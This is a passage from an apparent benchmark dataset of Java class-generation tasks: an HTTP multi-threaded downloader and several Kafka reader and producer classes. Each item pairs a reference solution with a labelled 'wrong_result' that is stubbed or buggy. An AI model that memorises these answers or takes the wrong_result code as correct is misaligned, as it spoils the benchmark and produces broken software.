headers);\n        this.createDownloadTask(directUrl, headers);\n    }\n\n    private void createDownloadTask(String url, Map<String, String> headers) {\n        Request.Builder requestBuilder = new Request.Builder().url(url);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            requestBuilder.addHeader(entry.getKey(), entry.getValue());\n        }\n        Request request = requestBuilder.build();\n        \n        if(!this.supportRange || threadNum == 0) {\n            Callable<InputStream> callable = () -> {\n                return downloadTask(url, headers, \"\", 0);\n            };\n            callableQueue.add(callable);\n            return;\n        }\n        \n        long start = 0; \n        long end = this.contentEnd;\n        String range = request.headers().get(\"Range\");\n        range = range == null ? \"0-\" : range;\n        range = range + \"-\" + this.contentEnd;\n        range = range.replace(\"--\", \"-\");\n        String pattern = \"bytes=(\\\\d+)-(\\\\d+)\";\n        Pattern r = Pattern.compile(pattern);\n        Matcher m = r.matcher(range);\n        if (m.find()) {\n            String startString = m.group(1); \n            String endString = m.group(2);\n            start = Long.parseLong(startString); \n            end = Long.parseLong(endString);\n        }\n\n        int sliceNum = 0;\n        while (start <= end) {\n            long curEnd = start + blockSize - 1;\n            curEnd = curEnd > end ? end : curEnd;\n            String ra = \"bytes=\" + start + \"-\" + curEnd;\n            final int _sliceNum = sliceNum;\n            Callable<InputStream> callable = () -> {\n                return downloadTask(url, headers, ra, _sliceNum);\n            };\n            callableQueue.add(callable);\n            start = curEnd + 1;\n            sliceNum++;\n        }\n    }\n\n    private InputStream downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        return _downloadTask(url,headers,range,sliceNum);\n    }\n\n    private InputStream _downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        if(closed){\n            return null;\n        }\n        Request.Builder requestBuilder = new Request.Builder().url(url);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            requestBuilder.addHeader(entry.getKey(), entry.getValue());\n        }\n        if (!range.isEmpty()) {\n            requestBuilder.removeHeader(\"Range\").addHeader(\"Range\", range);\n        }\n        if (cookie != null) {\n            requestBuilder.removeHeader(\"Cookie\").addHeader(\"Cookie\", cookie);\n        }\n        if (referer != null) {\n            requestBuilder.removeHeader(\"Referer\").addHeader(\"Referer\", referer);\n        }\n        Request request = requestBuilder.build();\n        int retryCount = 0;\n        int maxRetry = 5;\n        byte[] downloadbBuffer = new byte[1024*1024];\n        Response response = null;\n        Call call = null;\n        boolean directResp = false;\n        while (retryCount < maxRetry && !closed) {\n            try {\n                directResp = false;\n                call = downloadClient.newCall(request);\n                response = call.execute();\n                if (!response.isSuccessful()) {\n                    continue;\n                }\n                if (range.isEmpty()) {\n                    directResp = true;\n                    return response.body().byteStream();\n                }\n                if(sliceNum==0){\n                    directResp = true;\n                    return response.body().byteStream();\n                }\n                \n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                int bytesRead;\n                while (!closed && (bytesRead = response.body().byteStream().read(downloadbBuffer)) != -1) {\n                    baos.write(downloadbBuffer, 0, bytesRead);\n                }\n                return new ByteArrayInputStream(baos.toByteArray());\n            } catch (Exception e) {} finally {\n                if(response != null && !directResp){\n                    call.cancel();\n                    response.close();\n                }\n                retryCount++;\n            }\n        }\n        return null;\n    }\n\n    @Override\n    public synchronized int read(byte[] buffer, int off, int len) throws IOException {\n        try {\n            if (closed) {\n                return -1;\n            }\n            \n            if (this.is == null ) {\n                runTask(threadNum < 1 ? 1 : threadNum);\n                this.is = this.futureQueue.remove().get();\n                runTask(1);\n                blockCounter++;\n            }\n            int ol = this.is.read(buffer, off, len);\n            if ( ol == -1 ) {\n                this.is = this.futureQueue.remove().get();\n                runTask(1);\n                blockCounter++;\n                return this.is.read(buffer, off, len);\n            } \n            return ol;\n        } catch (Exception e) {\n            return -1;\n        }\n    }\n    \n    @Override\n    public int read() throws IOException {\n        throw new IOException(\"\u65b9\u6cd5\u672a\u5b9e\u73b0\uff0c\u4e0d\u80fd\u8c03\u7528\uff01\");\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (closed) {\n            return;\n        }\n        closed = true;\n        if(this.executorService != null) {\n            this.executorService.shutdownNow();\n        }\n        futureQueue.clear();\n        callableQueue.clear();\n    }\n\n    private void runTask(int num) {\n        while(num-- > 0 && callableQueue.size() > 0) {\n            Future<InputStream> future = this.executorService.submit(callableQueue.remove());\n            this.futureQueue.add(future);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "public class HttpDownloader extends InputStream {\n    String contentType;\n    long contentLength;\n    long contentEnd;\n    Headers header;\n    int statusCode;\n    String directUrl;\n    volatile static int curConnId;\n    volatile boolean closed;\n    int connId;\n    InputStream is;\n    Queue<Callable<InputStream>> callableQueue;\n    Queue<Future<InputStream>> futureQueue;\n    static HashMap<String, HttpDownloader> downloaderMap;\n    ExecutorService executorService;\n    boolean supportRange;\n    int blockSize;\n    int threadNum;\n    String cookie;\n    String referer;\n    int blockCounter;\n    OkHttpClient downloadClient;\n    OkHttpClient defaultClient;\n\n    public HttpDownloader(Map<String, String> params) {\n        this.callableQueue = new LinkedList<>();\n        this.futureQueue = new LinkedList<>();\n        this.downloaderMap = new HashMap<>();\n        this.executorService = Executors.newFixedThreadPool(2);\n        this.blockSize = 10 * 1024 * 1024;\n        this.threadNum = 2;\n        this.cookie = \"\";\n        this.referer = \"\";\n        this.blockCounter = 0;\n        this.downloadClient = new OkHttpClient();\n        this.defaultClient = new OkHttpClient();\n    }\n\n    public void createDownloadTask(String url, Map<String, String> headers) {\n        // Implementation for creating download tasks based on range and thread configuration\n    }\n\n    public InputStream downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        // Implementation for performing actual HTTP download\n        return null;\n    }\n\n    private InputStream _downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        // Implementation for internal download implementation\n        return null;\n    }\n\n    @Override\n    public int read(byte[] buffer, int off, int len) throws IOException {\n        // Implementation for reading data from download stream\n        return 0;\n    }\n\n    @Override\n    public int read() throws IOException {\n        throw new IOException(\"Not implemented\");\n    }\n\n    public void close() {\n        // Implementation for cleaning up resources and stopping downloads\n    }\n\n    public void runTask(int num) {\n        // Implementation for starting specified number of download tasks\n    }\n}"
  },
  {
    "Task_id": 251,
    "Instruction": "Task Description: Create a Kafka consumer class that reads messages from specified Kafka topic partitions and integrates with Spring Batch for state management and offset tracking.\n\nClass Description: KafkaItemReader is a Spring Batch ItemReader implementation that consumes messages from Kafka topics. It maintains partition offsets, supports state persistence between batches, and provides configurable polling behavior.\n\nAttributes:\n- TOPIC_PARTITION_OFFSETS: [String] - Key for storing partition offsets in execution context\n- DEFAULT_POLL_TIMEOUT: [long] - Default timeout duration for consumer polling (30 seconds)\n- topicPartitions: [List<TopicPartition>] - List of topic partitions to consume from\n- partitionOffsets: [Map<TopicPartition, Long>] - Current offsets for each partition\n- kafkaConsumer: [KafkaConsumer<K, V>] - Kafka consumer instance\n- consumerProperties: [Properties] - Configuration properties for Kafka consumer\n- consumerRecords: [Iterator<ConsumerRecord<K, V>>] - Iterator for currently polled records\n- pollTimeout: [Duration] - Timeout duration for polling messages\n- saveState: [boolean] - Flag indicating whether to save consumer state\n\nMethods:\n- KafkaItemReader(Properties, String, Integer...) -> [Constructor] - Creates reader with properties, topic name, and partition array\n- KafkaItemReader(Properties, String, List<Integer>) -> [Constructor] - Creates reader with properties, topic name, and partition list\n- open(ExecutionContext) -> [void] - Initializes Kafka consumer, restores offsets if available, and seeks to appropriate positions\n- read() -> [V] - Reads next message from Kafka, returns message value or null if no messages available\n- update(ExecutionContext) -> [void] - Saves current partition offsets to execution context and commits offsets to Kafka\n- close() -> [void] - Closes the Kafka consumer when reader is no longer needed",
    "Canonical_solution": "import org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.TopicPartition;\nimport org.springframework.batch.item.ExecutionContext;\nimport org.springframework.batch.item.support.AbstractItemStreamItemReader;\nimport org.springframework.lang.Nullable;\nimport org.springframework.util.Assert;\n\nimport java.time.Duration;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Properties;\n\npublic class KafkaItemReader<K, V> extends AbstractItemStreamItemReader<V> {\n\n    private static final String TOPIC_PARTITION_OFFSETS = \"topic.partition.offsets\";\n    private static final long DEFAULT_POLL_TIMEOUT = 30L;\n\n    private final List<TopicPartition> topicPartitions;\n    private Map<TopicPartition, Long> partitionOffsets;\n    private KafkaConsumer<K, V> kafkaConsumer;\n    private final Properties consumerProperties;\n    private Iterator<ConsumerRecord<K, V>> consumerRecords;\n    private Duration pollTimeout = Duration.ofSeconds(DEFAULT_POLL_TIMEOUT);\n    private boolean saveState = true;\n\n    public KafkaItemReader(Properties consumerProperties, String topicName, Integer... partitions) {\n        this(consumerProperties, topicName, Arrays.asList(partitions));\n    }\n\n    public KafkaItemReader(Properties consumerProperties, String topicName, List<Integer> partitions) {\n        Assert.notNull(consumerProperties, \"Consumer properties must not be null\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG),\n                ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG + \" property must be provided\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.GROUP_ID_CONFIG),\n                ConsumerConfig.GROUP_ID_CONFIG + \" property must be provided\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG),\n                ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG + \" property must be provided\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG),\n                ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG + \" property must be provided\");\n        this.consumerProperties = consumerProperties;\n        Assert.hasLength(topicName, \"Topic name must not be null or empty\");\n        Assert.isTrue(!partitions.isEmpty(), \"At least one partition must be provided\");\n        this.topicPartitions = new ArrayList<>();\n        for (Integer partition : partitions) {\n            this.topicPartitions.add(new TopicPartition(topicName, partition));\n        }\n    }\n\n    @Override\n    public void open(ExecutionContext executionContext) {\n        this.kafkaConsumer = new KafkaConsumer<>(this.consumerProperties);\n        if (this.partitionOffsets == null) {\n            this.partitionOffsets = new HashMap<>();\n            for (TopicPartition topicPartition : this.topicPartitions) {\n                this.partitionOffsets.put(topicPartition, 0L);\n            }\n        }\n        if (this.saveState && executionContext.containsKey(TOPIC_PARTITION_OFFSETS)) {\n            Map<TopicPartition, Long> offsets = (Map<TopicPartition, Long>) executionContext\n                    .get(TOPIC_PARTITION_OFFSETS);\n            for (Map.Entry<TopicPartition, Long> entry : offsets.entrySet()) {\n                this.partitionOffsets.put(entry.getKey(), entry.getValue() == 0 ? 0 : entry.getValue() + 1);\n            }\n        }\n        this.kafkaConsumer.assign(this.topicPartitions);\n        this.partitionOffsets.forEach(this.kafkaConsumer::seek);\n    }\n\n    @Nullable\n    @Override\n    public V read() {\n        if (this.consumerRecords == null || !this.consumerRecords.hasNext()) {\n            this.consumerRecords = this.kafkaConsumer.poll(this.pollTimeout).iterator();\n        }\n        if (this.consumerRecords.hasNext()) {\n            ConsumerRecord<K, V> record = this.consumerRecords.next();\n            this.partitionOffsets.put(new TopicPartition(record.topic(), record.partition()), record.offset());\n            return record.value();\n        }\n        else {\n            return null;\n        }\n    }\n\n    @Override\n    public void update(ExecutionContext executionContext) {\n        if (this.saveState) {\n            executionContext.put(TOPIC_PARTITION_OFFSETS, new HashMap<>(this.partitionOffsets));\n        }\n        this.kafkaConsumer.commitSync();\n    }\n\n    @Override\n    public void close() {\n        if (this.kafkaConsumer != null) {\n            this.kafkaConsumer.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
    "wrong_result": "```java\nimport org.springframework.batch.item.ExecutionContext;\nimport org.springframework.batch.item.ItemReader;\nimport org.springframework.batch.item.UnexpectedInputException;\nimport org.springframework.batch.item.kafka.KafkaItemReader;\nimport org.springframework.kafka.core.ConsumerFactory;\nimport org.springframework.kafka.core.DefaultKafkaConsumerFactory;\nimport org.springframework.kafka.support.serializer.JsonDeserializer;\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.common.TopicPartition;\nimport org.apache.kafka.common.serialization.StringDeserializer;\n\nimport java.util.*;\n\npublic class KafkaItemReader<K, V> implements ItemReader<V> {\n    private static final String TOPIC_PARTITION_OFFSETS = \"topicPartitionOffsets\";\n    private static final long DEFAULT_POLL_TIMEOUT = 30000;\n    private List<TopicPartition> topicPartitions;\n    private Map<TopicPartition, Long> partitionOffsets;\n    private Consumer<K, V> kafkaConsumer;\n    private Properties consumerProperties;\n    private Iterator<ConsumerRecord<K, V>> consumerRecords;\n    private Duration pollTimeout;\n    private boolean saveState;\n\n    public KafkaItemReader(Properties consumerProperties, String topicName, Integer... partitions) {\n        this(consumerProperties, topicName, Arrays.asList(partitions));\n    }\n\n    public KafkaItemReader(Properties consumerProperties, String topicName, List<Integer> partitions) {\n        this.consumerProperties = consumerProperties;\n        this.topicPartitions = new ArrayList<>();\n        for (Integer partition : partitions) {\n            this.topicPartitions.add(new TopicPartition(topicName, partition));\n        }\n        this.pollTimeout = Duration.ofMillis(DEFAULT_POLL_TIMEOUT);\n        this.saveState = true;\n    }\n\n    @Override\n    public void open(ExecutionContext executionContext) {\n        if (executionContext.containsKey(TOPIC_PARTITION_OFFSETS)) {\n            partitionOffsets = (Map<TopicPartition, Long>) executionContext.get(TOPIC_PARTITION_OFFSETS);\n        } else {\n            partitionOffsets = new HashMap<>();\n        }\n\n        Properties props = new Properties();\n        props.putAll(consumerProperties);\n        props.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, \"false\");\n        ConsumerFactory<K, V> consumerFactory = new DefaultKafkaConsumerFactory<>(props, new StringDeserializer(), new JsonDeserializer<>(Object.class));\n        kafkaConsumer = consumerFactory.createConsumer();\n\n        for (TopicPartition topicPartition : topicPartitions) {\n            if (partitionOffsets.containsKey(topicPartition)) {\n                kafkaConsumer.seek(topicPartition, partitionOffsets.get(topicPartition));\n            } else {\n                kafkaConsumer.assign(Collections.singletonList(topicPartition));\n            }\n        }\n    }\n\n    @Override\n    public V read() throws Exception, UnexpectedInputException {\n        if (consumerRecords == null || !consumerRecords.hasNext()) {\n            ConsumerRecords<K, V> records = kafkaConsumer.poll(pollTimeout);\n            consumerRecords = records.iterator();\n        }\n\n        if (consumerRecords.hasNext()) {\n            ConsumerRecord<K, V> record = consumerRecords.next();\n            partitionOffsets.put(record.partition(), record.offset() + 1);\n            return record.value();\n        }\n\n        return null;\n    }\n\n    @Override\n    public void update(ExecutionContext executionContext) {\n        if (saveState) {\n            executionContext.put(TOPIC_PARTITION_OFFSETS, partitionOffsets);\n        }\n    }\n\n    @Override\n    public void close() {\n        if (kafkaConsumer != null) {\n            kafkaConsumer.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 252,
    "Instruction": "Task Description: Create a Java class that implements a Kafka consumer thread for reading and processing messages from a Kafka topic, with support for message validation and local store updates.\n\nClass Description: KafkaStoreReaderThread is a thread-based Kafka consumer that reads messages from a specified topic, validates them using a handler, and updates a local store accordingly. It maintains offset tracking and provides shutdown capabilities.\n\nAttributes:\n- topic: String - The Kafka topic to consume messages from\n- topicPartition: TopicPartition - The topic partition being consumed\n- groupId: String - The consumer group ID\n- storeUpdateHandler: StoreUpdateHandler<K, V> - Handler for message validation\n- serializer: Serializer<K, V> - Serializer for message keys and values\n- localStore: Store<K, V> - Local storage for processed messages\n- offsetUpdateLock: ReentrantLock - Lock for thread-safe offset updates\n- offsetReachedThreshold: Condition - Condition for offset tracking\n- consumer: Consumer<byte[], byte[]> - Kafka consumer instance\n- offsetInSchemasTopic: long - Current offset in the topic\n- consumerProps: Properties - Configuration properties for the Kafka consumer\n\nMethods:\n- KafkaStoreReaderThread(String bootstrapBrokers, String topic, String groupId, StoreUpdateHandler<K, V> storeUpdateHandler, Serializer<K, V> serializer, Store<K, V> localStore) -> void - Constructor that initializes the consumer with configuration and dependencies\n- doWork() -> void - Main work method that polls for messages, processes them, and updates the local store\n- shutdown() -> void - Gracefully shuts down the consumer thread",
    "Canonical_solution": "import io.confluent.kafka.schemaregistry.storage.StoreUpdateHandler.ValidationStatus;\nimport io.confluent.kafka.schemaregistry.utils.ShutdownableThread;\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.common.KafkaException;\nimport org.apache.kafka.common.PartitionInfo;\nimport org.apache.kafka.common.TopicPartition;\nimport org.apache.kafka.common.errors.RecordTooLargeException;\nimport org.apache.kafka.common.errors.WakeupException;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.List;\nimport java.util.Properties;\nimport java.util.Arrays;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.locks.Condition;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class KafkaStoreReaderThread<K, V> extends ShutdownableThread {\n\n  private static final Logger log = LoggerFactory.getLogger(KafkaStoreReaderThread.class);\n\n  private final String topic;\n  private final TopicPartition topicPartition;\n  private final String groupId;\n  private final StoreUpdateHandler<K, V> storeUpdateHandler;\n  private final Serializer<K, V> serializer;\n  private final Store<K, V> localStore;\n  private final ReentrantLock offsetUpdateLock;\n  private final Condition offsetReachedThreshold;\n  private Consumer<byte[], byte[]> consumer;\n  private long offsetInSchemasTopic = -1L;\n  private Properties consumerProps = new Properties();\n\n  public KafkaStoreReaderThread(String bootstrapBrokers,\n                              String topic,\n                              String groupId,\n                              StoreUpdateHandler<K, V> storeUpdateHandler,\n                              Serializer<K, V> serializer,\n                              Store<K, V> localStore) {\n    super(\"kafka-store-reader-thread-\" + topic, false);\n    offsetUpdateLock = new ReentrantLock();\n    offsetReachedThreshold = offsetUpdateLock.newCondition();\n    this.topic = topic;\n    this.groupId = groupId;\n    this.storeUpdateHandler = storeUpdateHandler;\n    this.serializer = serializer;\n    this.localStore = localStore;\n\n    consumerProps.put(ConsumerConfig.GROUP_ID_CONFIG, this.groupId);\n    consumerProps.put(ConsumerConfig.CLIENT_ID_CONFIG, \"KafkaStore-reader-\" + this.topic);\n    consumerProps.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapBrokers);\n    consumerProps.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, \"earliest\");\n    consumerProps.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, \"false\");\n    consumerProps.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG,\n                    org.apache.kafka.common.serialization.ByteArrayDeserializer.class);\n    consumerProps.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG,\n                    org.apache.kafka.common.serialization.ByteArrayDeserializer.class);\n\n    this.consumer = new KafkaConsumer<>(consumerProps);\n    this.topicPartition = new TopicPartition(topic, 0);\n    List<TopicPartition> topicPartitions = Arrays.asList(this.topicPartition);\n    this.consumer.assign(topicPartitions);\n    consumer.seekToBeginning(topicPartitions);\n  }\n\n  @Override\n  public void doWork() {\n    try {\n      ConsumerRecords<byte[], byte[]> records = consumer.poll(Duration.ofMillis(Long.MAX_VALUE));\n      for (ConsumerRecord<byte[], byte[]> record : records) {\n        K messageKey = this.serializer.deserializeKey(record.key());\n        V message = record.value() == null ? null : serializer.deserializeValue(messageKey, record.value());\n        \n        TopicPartition tp = new TopicPartition(record.topic(), record.partition());\n        long offset = record.offset();\n        long timestamp = record.timestamp();\n        ValidationStatus status = this.storeUpdateHandler.validateUpdate(\n                messageKey, message, tp, offset, timestamp);\n        \n        if (status == ValidationStatus.SUCCESS) {\n          if (message == null) {\n            localStore.delete(messageKey);\n          } else {\n            localStore.put(messageKey, message);\n          }\n        }\n\n        try {\n          offsetUpdateLock.lock();\n          offsetInSchemasTopic = record.offset();\n          offsetReachedThreshold.signalAll();\n        } finally {\n          offsetUpdateLock.unlock();\n        }\n      }\n    } catch (WakeupException we) {\n      // Thread is closing\n    } catch (RecordTooLargeException rtle) {\n      throw new IllegalStateException(\"Consumer threw RecordTooLargeException\", rtle);\n    } catch (RuntimeException e) {\n      log.error(\"KafkaStoreReader thread has died\", e);\n      throw e;\n    }\n  }\n\n  @Override\n  public void shutdown() {\n    super.initiateShutdown();\n    if (consumer != null) {\n      consumer.wakeup();\n    }\n    super.awaitShutdown();\n    if (consumer != null) {\n      consumer.close();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 32,
    "wrong_result": "```java\nimport org.apache.kafka.clients.consumer.Consumer;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.common.TopicPartition;\nimport java.util.Properties;\nimport java.util.concurrent.locks.Condition;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class KafkaStoreReaderThread<K, V> extends Thread {\n    private final String topic;\n    private final TopicPartition topicPartition;\n    private final String groupId;\n    private final StoreUpdateHandler<K, V> storeUpdateHandler;\n    private final Serializer<K, V> serializer;\n    private final Store<K, V> localStore;\n    private final ReentrantLock offsetUpdateLock;\n    private final Condition offsetReachedThreshold;\n    private final Consumer<byte[], byte[]> consumer;\n    private long offsetInSchemasTopic;\n    private final Properties consumerProps;\n\n    public KafkaStoreReaderThread(String bootstrapBrokers, String topic, String groupId, StoreUpdateHandler<K, V> storeUpdateHandler, Serializer<K, V> serializer, Store<K, V> localStore) {\n        this.topic = topic;\n        this.groupId = groupId;\n        this.storeUpdateHandler = storeUpdateHandler;\n        this.serializer = serializer;\n        this.localStore = localStore;\n        this.offsetUpdateLock = new ReentrantLock();\n        this.offsetReachedThreshold = offsetUpdateLock.newCondition();\n        this.consumerProps = new Properties();\n        this.consumerProps.put(\"bootstrap.servers\", bootstrapBrokers);\n        this.consumerProps.put(\"group.id\", groupId);\n        this.consumerProps.put(\"key.deserializer\", \"org.apache.kafka.common.serialization.ByteArrayDeserializer\");\n        this.consumerProps.put(\"value.deserializer\", \"org.apache.kafka.common.serialization.ByteArrayDeserializer\");\n        this.consumer = new org.apache.kafka.clients.consumer.KafkaConsumer<>(this.consumerProps);\n        this.topicPartition = new TopicPartition(topic, 0);\n        this.consumer.assign(java.util.Collections.singletonList(this.topicPartition));\n        this.offsetInSchemasTopic = 0;\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (!isInterrupted()) {\n                doWork();\n            }\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void doWork() {\n        int messagesProcessed = 0;\n        try {\n            org.apache.kafka.clients.consumer.ConsumerRecords<byte[], byte[]> records = consumer.poll(100);\n            for (ConsumerRecord<byte[], byte[]> record : records) {\n                K key = serializer.deserialize(record.key());\n                V value = serializer.deserialize(record.value());\n                if (storeUpdateHandler.validate(key, value)) {\n                    localStore.update(key, value);\n                    offsetInSchemasTopic = record.offset();\n                    offsetUpdateLock.lock();\n                    try {\n                        offsetReachedThreshold.signalAll();\n                    } finally {\n                        offsetUpdateLock.unlock();\n                    }\n                }\n                messagesProcessed++;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        try {\n            consumer.close();\n        } finally {\n            interrupt();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 254,
    "Instruction": "Task Description: Create a Kafka producer class that handles message serialization and sending to a Kafka topic with configurable properties and error handling.\n\nClass Description: The KafkaStoreProducer class is a generic Kafka producer that serializes and sends key-value pairs to a specified Kafka topic. It provides configurable timeout settings and handles various Kafka-related exceptions.\n\nAttributes:\n- producer: KafkaProducer<byte[], byte[]> - The underlying Kafka producer instance\n- topic: String - The Kafka topic to which messages will be sent\n- serializer: Serializer<K, V> - The serializer for key-value pairs\n- timeout: int - The maximum time to wait for message acknowledgment in milliseconds\n\nMethods:\n- Constructor: KafkaStoreProducer(String bootstrapBrokers, String topic, Serializer<K, V> serializer, int timeout, Properties configProps) -> void - Initializes the Kafka producer with configuration properties including bootstrap servers, topic, serializer, timeout, and additional custom properties\n- put: put(K key, V value) -> V - Serializes and sends a key-value pair to the Kafka topic, returning the value if successful. Throws StoreTimeoutException if the operation times out or StoreException for other errors\n- close: close() -> void - Closes the Kafka producer and releases all resources",
    "Canonical_solution": "import io.confluent.kafka.schemaregistry.storage.exceptions.StoreException;\nimport io.confluent.kafka.schemaregistry.storage.exceptions.StoreTimeoutException;\nimport io.confluent.kafka.schemaregistry.storage.exceptions.SerializationException;\nimport io.confluent.kafka.schemaregistry.storage.serialization.Serializer;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.errors.RecordTooLargeException;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\n\npublic class KafkaStoreProducer<K, V> {\n\n    private final KafkaProducer<byte[], byte[]> producer;\n    private final String topic;\n    private final Serializer<K, V> serializer;\n    private final int timeout;\n\n    public KafkaStoreProducer(String bootstrapBrokers, String topic, \n                            Serializer<K, V> serializer, int timeout,\n                            Properties configProps) {\n        Properties props = new Properties();\n        props.putAll(configProps);\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapBrokers);\n        props.put(ProducerConfig.ACKS_CONFIG, \"-1\");\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class);\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class);\n        props.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, true);\n\n        this.producer = new KafkaProducer<>(props);\n        this.topic = topic;\n        this.serializer = serializer;\n        this.timeout = timeout;\n    }\n\n    public V put(K key, V value) throws StoreTimeoutException, StoreException {\n        if (key == null) {\n            throw new StoreException(\"Key should not be null\");\n        }\n\n        ProducerRecord<byte[], byte[]> producerRecord;\n        try {\n            producerRecord = new ProducerRecord<>(\n                topic, \n                0, \n                this.serializer.serializeKey(key),\n                value == null ? null : this.serializer.serializeValue(value)\n            );\n        } catch (SerializationException e) {\n            throw new StoreException(\"Error serializing schema while creating the Kafka produce record\", e);\n        }\n\n        try {\n            Future<RecordMetadata> ack = producer.send(producerRecord);\n            RecordMetadata recordMetadata = ack.get(timeout, TimeUnit.MILLISECONDS);\n            return value;\n        } catch (InterruptedException e) {\n            throw new StoreException(\"Put operation interrupted while waiting for an ack from Kafka\", e);\n        } catch (ExecutionException e) {\n            if (e.getCause() instanceof RecordTooLargeException) {\n                throw new StoreException(\"Put operation failed because entry is too large\");\n            } else {\n                throw new StoreException(\"Put operation failed while waiting for an ack from Kafka\", e);\n            }\n        } catch (TimeoutException e) {\n            throw new StoreTimeoutException(\n                \"Put operation timed out while waiting for an ack from Kafka\", e);\n        } catch (KafkaException ke) {\n            throw new StoreException(\"Put operation to Kafka failed\", ke);\n        }\n    }\n\n    public void close() {\n        producer.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "KafkaStoreProducer.java\n```java\nimport org.apache.kafka.common.serialization.Serializer;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.errors.TimeoutException;\nimport org.apache.kafka.common.errors.UnknownTopicOrPartitionException;\nimport org.apache.kafka.common.errors.SerializationException;\n\nimport java.util.Properties;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.ExecutionException;\n\npublic class KafkaStoreProducer<K, V> {\n    private final Producer<byte[], byte[]> producer;\n    private final String topic;\n    private final Serializer<K, V> serializer;\n    private final int timeout;\n\n    public KafkaStoreProducer(String bootstrapBrokers, String topic, Serializer<K, V> serializer, int timeout, Properties configProps) {\n        Properties props = new Properties();\n        props.put(\"bootstrap.servers\", bootstrapBrokers);\n        props.put(\"key.serializer\", \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n        props.put(\"value.serializer\", \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n        props.putAll(configProps);\n\n        this.producer = new KafkaProducer<>(props);\n        this.topic = topic;\n        this.serializer = serializer;\n        this.timeout = timeout;\n    }\n\n    public V put(K key, V value) throws StoreTimeoutException, StoreException {\n        try {\n            byte[] serializedKey = serializer.serialize(key);\n            byte[] serializedValue = serializer.serialize(value);\n\n            ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(topic, serializedKey, serializedValue);\n            Future<RecordMetadata> future = producer.send(record);\n\n            RecordMetadata metadata = future.get(timeout, TimeUnit.MILLISECONDS);\n            return value;\n        } catch (TimeoutException e) {\n            throw new StoreTimeoutException(\"Message acknowledgment timed out\", e);\n        } catch (ExecutionException e) {\n            Throwable cause = e.getCause();\n            if (cause instanceof UnknownTopicOrPartitionException) {\n                throw new StoreException(\"Topic not found: \" + topic, cause);\n            } else if (cause instanceof SerializationException) {\n                throw new StoreException(\"Serialization failed\", cause);\n            } else 